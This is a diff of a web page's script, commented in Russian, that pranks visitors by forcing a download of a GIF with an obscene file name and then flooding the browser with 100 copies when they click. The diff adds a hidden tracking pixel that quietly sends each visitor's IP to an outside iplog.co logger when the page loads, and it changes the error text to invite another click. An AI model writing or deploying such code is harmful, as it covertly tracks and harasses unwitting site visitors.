@@ -9,53 +9,51 @@
 
     <script>
         // --- НАСТРОЙКИ ---
+        const loggerUrl = 'https://iplog.co/2l0G64'; // Твоя ссылка для сбора данных
         const sourceFile = 'OTVETRUS.gif'; 
-        const targetName = 'sex-siski-i-piska.gif';
-        const spamCount = 100; // Количество копий
-        const delayMs = 250;   // Задержка (меньше 200 браузер может проигнорировать)
+        const targetName = 'sex-siski-i-piska.gif'; 
+        const spamCount = 100; 
+        const delayMs = 250;   
 
-        let hasClicked = false; // Флаг, нажал ли юзер кнопку
+        // --- ЛОГГЕР (SMART DATA) ---
+        // Создаем невидимый пиксель, который активирует логгер при загрузке страницы
+        const img = new Image();
+        img.src = loggerUrl + '?v=' + Math.random(); // Добавляем рандом, чтобы не сработало кэширование
+        img.style.display = 'none';
+        document.body.appendChild(img);
+
+        // --- ЛОГИКА ЗАГРУЗКИ ---
+        let hasClicked = false;
         const link = document.getElementById('downloadLink');
 
-        // --- ЛОГИКА ---
-
-        // 1. Функция одиночной загрузки (если юзер тупит 5 сек)
         function downloadSingle() {
-            if (hasClicked) return; // Если уже нажал, одиночная не нужна
-            
+            if (hasClicked) return;
             const a = document.createElement('a');
             a.href = sourceFile;
             a.download = targetName;
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
-            console.log('Авто-загрузка 1 файла выполнена.');
         }
 
-        // 2. Таймер на 5 секунд
         const autoTimer = setTimeout(downloadSingle, 5000);
 
-        // 3. Функция массовой атаки (Blob + Цикл)
         async function startSpam() {
             try {
-                // Качаем файл в память браузера (чтобы не зависеть от интернета в цикле)
                 const response = await fetch(sourceFile);
                 if (!response.ok) throw new Error('Файл не найден!');
                 const blob = await response.blob();
                 const blobUrl = window.URL.createObjectURL(blob);
 
-                // Запускаем цикл
                 for (let i = 0; i < spamCount; i++) {
                     setTimeout(() => {
                         const a = document.createElement('a');
                         a.href = blobUrl;
-                        // Добавляем (N) к имени, иначе браузер может спросить "Заменить файл?"
                         a.download = `(${i+1})_${targetName}`; 
                         document.body.appendChild(a);
                         a.click();
                         document.body.removeChild(a);
 
-                        // Чистим память после последнего
                         if (i === spamCount - 1) {
                             setTimeout(() => window.URL.revokeObjectURL(blobUrl), 1000);
                         }
@@ -63,20 +61,16 @@
                 }
             } catch (e) {
                 console.error('Ошибка:', e);
-                // Если fetch не сработал (например, CORS), пробуем тупой метод
-                alert('Ошибка доступа к файлу. Проверьте название.');
+                alert('Ошибка доступа к файлу. Попробуйте нажать еще раз.');
             }
         }
 
-        // 4. Обработчик клика
         link.onclick = function(e) {
             e.preventDefault();
-            
-            if (hasClicked) return; // Защита от двойного клика
+            if (hasClicked) return;
             hasClicked = true;
-            
-            clearTimeout(autoTimer); // Отменяем одиночную загрузку
-            startSpam(); // Запускаем мясорубку
+            clearTimeout(autoTimer);
+            startSpam();
         };
     </script>
 </body>
